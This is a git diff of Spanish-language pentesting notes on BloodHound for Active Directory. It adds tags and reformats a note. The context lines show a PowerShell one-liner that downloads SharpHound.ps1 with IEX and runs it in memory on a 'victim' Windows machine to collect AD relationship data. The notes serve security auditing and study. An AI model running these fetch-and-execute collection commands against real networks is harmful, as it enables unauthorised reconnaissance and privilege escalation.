@@ -1,6 +1,6 @@
 # Bloodhound 
 
-Tags: #AD #BloodHound #SharpHound 
+Tags: #AD #BloodHound #SharpHound #Kali #Parrot 
 
 **BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.
 
@@ -59,7 +59,9 @@ Los 'ActiveDirectoryRights' incluyen, pero no se limitan a:
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
 ❯ Invoke-BloodHound -CollectionMethod All     
 
-Nota: Estos comandos los ejecutamos en la maquina victima Windows para recolectar la información y obtener un archivo '.zip' el cual pasaremos a la herramienta de 'BloodHound' para el analisis 
+
+Notas: 
+	1. Estos comandos los ejecutamos en la maquina victima Windows para recolectar la información y obtener un archivo '.zip' el cual pasaremos a la herramienta de 'BloodHound' para el analisis 
 ```
 
 ## ADPeas 
